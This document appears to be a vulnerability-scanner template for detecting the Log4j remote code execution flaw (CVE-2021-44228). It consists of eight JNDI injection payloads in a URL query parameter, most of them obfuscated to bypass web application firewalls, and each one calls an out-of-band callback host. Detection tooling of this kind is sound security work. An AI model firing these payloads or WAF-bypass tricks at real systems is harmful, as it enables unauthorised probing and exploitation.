id: log4j-rce-detect-waf-bypass
info:
  author: toramanemre
  name: Apache Log4j RCE (CVE-2021-44228) Detection with WAF Bypass (CloudFlare etc.)
requests:
- headers:
    Host: '{{Host}}'
  matchers:
  - name: dns
    part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}/?q=${jndi:ldap://{{interactsh-url}}/poc}'
  - '{{BaseURL}}/?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}poc}'
  - '{{BaseURL}}/?q=${${::-j}ndi:rmi://{{interactsh-url}}/poc}'
  - '{{BaseURL}}/?q=${jndi:rmi://{{interactsh-url}}}'
  - '{{BaseURL}}/?q=${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}'
  - '{{BaseURL}}/?q=${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}'
  - '{{BaseURL}}/?q=${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}'
  - '{{BaseURL}}/?q=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}'
